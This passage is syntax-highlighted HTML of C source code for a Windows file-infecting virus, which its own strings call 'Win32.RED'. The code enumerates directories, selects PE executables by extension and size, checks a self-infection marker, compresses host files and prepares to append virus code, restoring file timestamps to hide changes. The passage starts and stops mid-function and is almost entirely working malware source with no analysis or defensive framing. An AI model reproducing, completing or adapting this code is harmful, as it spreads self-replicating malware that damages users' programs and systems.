    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">pMZ</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">hHandle2</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc11">WriteAccess</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">FILE_MAP_WRITE</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">FILE_MAP_READ</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc9">#ifdef compr
</span><span class="sc0">                      </span><span class="sc4">0</span><span class="sc0">
                      </span><span class="sc9">#else
</span><span class="sc0">                      </span><span class="sc11">WriteAccess</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">NewFileSize</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">
                      </span><span class="sc9">#endif
</span><span class="sc0">                     </span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pMZ</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseTruncFile</span><span class="sc10">(</span><span class="sc11">WriteAccess</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">CloseTruncFile</span><span class="sc10">(</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">WriteAccess</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hHandle2</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WriteAccess</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc9">#ifndef compr
</span><span class="sc0">    </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SetEndOfFile</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">ftLastWriteTime</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">InfectPath</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pSrc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pTgt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pExt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndRelocs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pRelocBase</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#ifdef compr
</span><span class="sc0">  </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pComprBuf</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">SystemTime</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">FileExt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TgtVir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawDelta</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nCount</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nSections</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nRvas</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc11">pSectionHdr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc11">pPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_BASE_RELOCATION</span><span class="sc0"> </span><span class="sc11">pRelocs</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_RELOCATION_DATA</span><span class="sc0"> </span><span class="sc11">pRelocData</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc11">pImports</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc11">pImportData</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFindFile</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">Infect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bValidHeader</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#ifdef icon
</span><span class="sc0">  </span><span class="sc11">ICONIMAGES</span><span class="sc0"> </span><span class="sc11">IconImages</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0x7F</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">*(</span><span class="sc11">PDWORD</span><span class="sc10">)(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'*.*'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">  </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">MB_YESNOCANCEL</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONEXCLAMATION</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDCANCEL</span><span class="sc10">:</span><span class="sc0">
      </span><span class="sc11">CancelFolderSeek</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDNO</span><span class="sc10">:</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">hFindFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0">
        </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc9">#ifdef compr
</span><span class="sc0">    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">KeySecond</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TmpKeySec</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">IsFile</span><span class="sc10">(&amp;</span><span class="sc11">FindData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeHigh</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc9">#ifdef compr
</span><span class="sc0">        </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MIN_FILESIZE</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc10">(</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">MAX_FILESIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc9">#ifndef compr
</span><span class="sc0">        </span><span class="sc10">!(</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">SIZE_PAD</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc9">#else
</span><span class="sc0">        </span><span class="sc10">(</span><span class="sc11">FileTimeToSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">ftLastWriteTime</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">SystemTime</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">TmpKeySec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
          </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)(((</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wYear</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wMonth</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                  </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                  </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wMinute</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0x6A</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x3E</span><span class="sc10">),</span><span class="sc0">
         </span><span class="sc11">KeySecond</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TmpKeySec</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">TmpKeySec</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TmpKeySec</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0">
         </span><span class="sc11">KeySecond</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">       </span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc9">#ifdef compr
</span><span class="sc0">    </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">SystemTime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">KeySecond</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">)</span><span class="sc0">
             </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FileExt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc11">PDWORD</span><span class="sc10">)(</span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SIZEOF_FILEEXT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">~</span><span class="sc4">0xFF202020</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">pExt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szExts</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileExt</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">PDWORD</span><span class="sc10">)</span><span class="sc11">pExt</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">~</span><span class="sc4">0xFF202020</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
          </span><span class="sc11">pTgt</span><span class="sc10">[-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SIZEOF_FILEEXT</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
          </span><span class="sc10">!</span><span class="sc11">OpenMapFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">READ_ONLY</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc9">#ifdef compr
</span><span class="sc0">      </span><span class="sc11">pComprBuf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_magic</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_DOS_SIGNATURE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">bValidHeader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pMZ</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pPE</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pPE</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">)</span><span class="sc0">
                         </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x7F</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">bValidHeader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">,</span><span class="sc0">
             </span><span class="sc11">pPE</span><span class="sc10">-&gt;</span><span class="sc11">Signature</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_NT_SIGNATURE</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
             </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawSelfCheck</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'A92/'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc9">#ifndef compr
</span><span class="sc0">            </span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc9">#else
</span><span class="sc0">          </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nMaxComprSize</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">pComprBuf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
                 </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc0">
                          </span><span class="sc11">LPTR</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc11">nMaxComprSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
                            </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc0">
                        </span><span class="sc10">)</span><span class="sc0">
              </span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">            </span><span class="sc9">#if 0
</span><span class="sc0">            </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Host encoding is about to start.."</span><span class="sc10">,</span><span class="sc0">
                       </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc11">nComprSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
              </span><span class="sc11">jq_encode</span><span class="sc10">(</span><span class="sc11">pComprBuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nMaxComprSize</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">),</span><span class="sc0">
                        </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc10">),</span><span class="sc0">
                        </span><span class="sc11">ComprMem</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">TgtVir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CipherTarget</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nComprSize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">PE_HEADER_OFFSET</span><span class="sc0">
                       </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x1FF</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">0x200</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PE_HEADER_OFFSET</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TgtVir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">)</span><span class="sc0">
              </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">              </span><span class="sc9">#if 0
</span><span class="sc0">              </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Host encoded succesfully!"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">),</span><span class="sc0">
              </span><span class="sc9">#endif
</span><span class="sc0">              </span><span class="sc9">#endif
</span><span class="sc0">              </span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">            </span><span class="sc9">#if 0
</span><span class="sc0">            </span><span class="sc5">else</span><span class="sc0">
              </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Host encoded succesfully, but "</span><span class="sc0">
                               </span><span class="sc6">"Win32.RED code didn't fit, "</span><span class="sc0">
                               </span><span class="sc6">"skipping file.."</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc9">#endif
</span><span class="sc0">          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">CloseUnmapFile</span><span class="sc10">(</span><span class="sc11">READ_ONLY</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc9">#ifdef compr
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pComprBuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">GlobalFree</span><span class="sc10">(</span><span class="sc11">pComprBuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc11">MB_YESNOCANCEL</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONEXCLAMATION</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDCANCEL</span><span class="sc10">:</span><span class="sc0">
